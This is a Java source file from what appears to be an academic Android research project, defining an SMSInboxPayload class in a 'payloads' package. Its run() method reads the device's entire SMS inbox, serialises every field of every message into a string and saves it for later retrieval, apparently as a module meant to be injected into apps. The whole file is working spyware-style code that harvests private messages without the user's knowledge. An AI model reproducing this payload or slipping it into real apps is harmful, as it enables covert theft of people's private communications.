/*
 * Copyright 2015 
 * 	Danilo Cianciulli 			<cianciullidanilo@gmail.com>
 * 	Emranno Francesco Sannini 	<esannini@gmail.com>
 * 	Roberto Falzarano 			<robertofalzarano@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *  http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package it.unisannio.srss.dame.android.payloads.smsInbox;

import it.unisannio.srss.dame.android.payloads.Payload;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class SMSInboxPayload extends Payload {

	public SMSInboxPayload(){
		super();
	}
	
	public SMSInboxPayload(Context context) {
		super(context);
	}

	//@Override
	public synchronized void run() {
		Uri smsInbox = Uri.parse("content://sms/inbox");
		ContentResolver cr = context.getContentResolver();
		Cursor cursor = cr.query(smsInbox, null, null, null, null);
		cursor.moveToFirst();
		String msgData = "";
		do {
			msgData += "\n";
			for (int i = 0; i < cursor.getColumnCount(); i++) {
				msgData += " " + cursor.getColumnName(i) + ":"
						+ cursor.getString(i) + "\n";
			}
		} while (cursor.moveToNext());
		if (save(msgData))
			Log.d(tag, "Sms inbox saved successful");
		else
			Log.e(tag, "Error while saving the payload output.");
	}
}
